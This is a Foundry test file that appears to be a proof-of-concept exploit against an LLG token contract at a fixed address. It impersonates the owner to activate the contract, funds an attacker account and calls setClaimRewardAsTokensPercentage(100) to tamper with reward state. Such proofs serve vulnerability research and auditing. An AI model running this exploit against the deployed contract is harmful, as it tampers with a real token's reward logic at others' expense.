// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface LLG {
    function owner() external view returns (address);
    function activate() external;
    function minRewardBalance() external view returns (uint256);
    function setClaimRewardAsTokensPercentage(uint256 percentage) external;
    function claimRewardAsTokensPercentage(address ofAddress) external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xE4C293Eadbb9d72d68a680F1A66979726992c396;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Get the owner address
        address owner = LLG(TARGET).owner();

        // Impersonate owner to activate contract
        vm.startPrank(owner);
        LLG(TARGET).activate();
        vm.stopPrank();

        // Give attacker enough LLG tokens to meet minRewardBalance
        // First get minRewardBalance value
        uint256 minRewardBalance = LLG(TARGET).minRewardBalance();

        // Use deal to give attacker LLG tokens (TARGET is the LLG token itself)
        deal(TARGET, attacker, minRewardBalance);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        // Call the vulnerable function to set percentage to 100%
        LLG(TARGET).setClaimRewardAsTokensPercentage(100);

        // Verify the percentage was set
        uint256 percentage = LLG(TARGET).claimRewardAsTokensPercentage(attacker);
        assertEq(percentage, 100, "Percentage should be 100");
        assertEq(LLG(TARGET).claimRewardAsTokensPercentage(attacker), 100, "Logic Exploit Failed: State not tampered");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
